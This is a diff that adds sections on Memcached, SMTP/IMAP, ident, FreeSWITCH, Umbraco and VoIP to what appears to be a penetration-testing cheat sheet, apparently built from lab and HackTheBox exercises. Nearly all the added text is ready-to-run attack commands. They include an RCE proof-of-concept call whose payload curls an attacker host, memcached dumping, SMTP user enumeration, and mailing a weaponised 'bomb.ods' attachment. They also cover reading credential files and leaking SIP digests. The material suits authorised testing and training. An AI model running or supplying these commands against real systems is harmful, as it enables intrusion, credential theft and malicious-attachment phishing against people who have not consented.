@@ -140,6 +140,12 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [Python](#python)
   - [Redis 6379](#redis-6379)
   - [Oracle TNS](#oracle-tns)
+  - [Memcached](#memcached)
+  - [SMTP / IMAP](#smtp--imap)
+  - [113 ident](#113-ident)
+  - [FreeSWITCH](#freeswitch)
+  - [Umbraco](#umbraco)
+  - [VoIP penetration test](#voip-penetration-test)
 - [Thick client vulnerabilities](#thick-client-vulnerabilities)
   - [DLL Hijacking](#dll-hijacking)
   - [Insecure application design](#insecure-application-design)
@@ -3794,6 +3800,82 @@ If you have found a password
 
 5. Execute files
 - `python3 odat.py externaltable -s IP -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe`
+
+
+### <ins>Memcached</ins>
+
+- `telnet IP 11211`
+- `msf > use auxiliary/gather/memcached_extractor`
+- `memcdump --servers=IP`
+- `memccat --servers=IP <item1> <item2>`
+- CVE-2021-33026 RCE
+  - `python cve-2021-33026_PoC.py --rhost IP --rport 5000 --cmd "curl http://ATTACKERIP" --cookie "session:de43fcb3-d960-4851-b14a-f7da3993e33d"`
+
+
+### <ins>SMTP / IMAP</ins>
+
+- `sudo perl ~/Documents/scripts/smtp/smtp-user-enum.pl -M VRFY -U /home/kali/Documents/lists/common_list/usernames.txt -t IP`
+- Connect to imap
+  ```
+  telnet IP 110
+  USER sales
+  PASS sales
+  list         <# list messages  #>
+  retr 1       <# show message 1 #>
+  ```
+- connect to smtp
+  ```
+  nc -v IP 25
+  helo test
+  MAIL FROM: it@postfish.off
+  RCPT TO: brian.moore@postfish.off
+  DATA
+  [write now the body of the email]
+  <CR><LF>.<CR><LF>
+  QUIT
+  ```
+- Another IMAP connection
+  ```
+  nc IP 143
+  tag login jonas@localhost SicMundusCreatusEst
+  tag LIST "" "*"
+  tag SELECT INBOX
+  tag STATUS INBOX (MESSAGES)
+  tag fetch 1 (BODY[1])
+  ```
+- `sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s IP:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a bomb.ods`
+
+
+
+### <ins>113 ident</ins>
+
+- `nc -vn IP 113`
+- `ident-user-enum IP 113`
+  - you can enumerate users for every port
+  - > "Is an Internet protocol that helps identify the user of a particular TCP connection"
+- https://book.hacktricks.xyz/pentesting/113-pentesting-ident
+
+
+
+### <ins>FreeSWITCH</ins>
+
+- Discover password: `/etc/freeswitch/autoload_configs/event_socket.conf.xml`
+
+
+### <ins>Umbraco</ins>
+
+- Umbraco Database Connection Credentials: `strings App_Data/Umbraco.sdf | grep admin`
+  - See these resources:
+    - https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials
+    - https://app.hackthebox.com/machines/234
+
+
+### <ins>VoIP penetration test</ins>
+
+- `python3 sipdigestleak.py -i IP`
+  - Find credentials
+- `sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav`
+  - decrypt raw voip data
 
 
 ## Thick client vulnerabilities
